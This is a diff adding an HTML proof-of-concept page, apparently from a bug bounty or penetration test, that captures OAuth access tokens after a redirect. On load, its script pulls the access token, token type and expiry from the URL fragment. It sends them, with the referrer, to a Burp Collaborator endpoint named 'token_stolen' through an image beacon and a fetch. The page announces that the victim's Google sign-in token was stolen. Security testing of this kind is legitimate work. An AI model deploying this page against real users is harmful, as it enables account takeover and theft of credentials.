@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+  <html>
+  <head>
+  <title>Token Captured</title>
+  <style>
+    body { margin: 0; background: #0d1117; color: #e6edf3; font-family: Arial;
+           display: flex; flex-direction: column; align-items: center;
+           justify-content: center; min-height: 100vh; text-align: center; }
+    h1 { color: #ff6b6b; font-size: 40px; }
+    .token-box { background: #161b22; border: 2px solid #f85149;
+                 border-radius: 8px; padding: 20px; margin: 20px;
+                 max-width: 700px; word-break: break-all; font-family: monospace;
+                 font-size: 13px; color: #79c0ff; text-align: left; }
+    .label { color: #8b949e; font-size: 11px; text-transform: uppercase;
+             letter-spacing: 1px; margin-bottom: 8px; }
+    .green { color: #3fb950; font-weight: bold; }
+  </style>
+  <script>
+  window.onload = function() {
+
+      // Parse token from URL fragment (#access_token=...&token_type=...&...)
+      var fragment = window.location.hash.substring(1);
+      var params = {};
+      fragment.split('&').forEach(function(p) {
+          var kv = p.split('=');
+          params[kv[0]] = decodeURIComponent(kv[1] || '');
+      });
+
+      var token     = params['access_token'] || 'not found';
+      var tokenType = params['token_type']   || '';
+      var expiresIn = params['expires_in']   || '';
+
+      // Display token on page
+      document.getElementById('token-val').textContent  = token;
+      document.getElementById('type-val').textContent   = tokenType;
+      document.getElementById('expiry-val').textContent = expiresIn + 's';
+
+      // Send to Burp Collaborator
+      var burp = 'https://svr12vlpoyu50fzs5cwtkenpcgi7fv6jv.oastify.com/token_stolen' +
+                 '?access_token=' + encodeURIComponent(token) +
+                 '&token_type='   + encodeURIComponent(tokenType) +
+                 '&expires_in='   + encodeURIComponent(expiresIn) +
+                 '&referrer='     + encodeURIComponent(document.referrer);
+
+      new Image().src = burp;
+      fetch(burp, { mode: 'no-cors' });
+
+      console.log('Token exfiltrated to Burp:', token);
+  };
+  </script>
+  </head>
+  <body>
+    <h1>🔑 OAuth Token Stolen</h1>
+    <p>Victim completed Google sign-in.<br>
+       Token has been sent to attacker's server.</p>
+
+    <div class="token-box">
+      <div class="label">Access Token</div>
+      <span id="token-val" class="green">reading...</span>
+    </div>
+
+    <div class="token-box">
+      <div class="label">Token Type</div>
+      <span id="type-val"></span>
+      &nbsp;&nbsp;
+      <div class="label" style="display:inline">Expires In</div>
+      <span id="expiry-val"></span>
+    </div>
+
+    <p style="color:#8b949e; font-size:13px">
+      Token also sent to:<br>
+      <code style="color:#79c0ff">svr12vlpoyu50fzs5cwtkenpcgi7fv6jv.oastify.com/token_stolen</code>
+    </p>
+  </body>
+  </html>
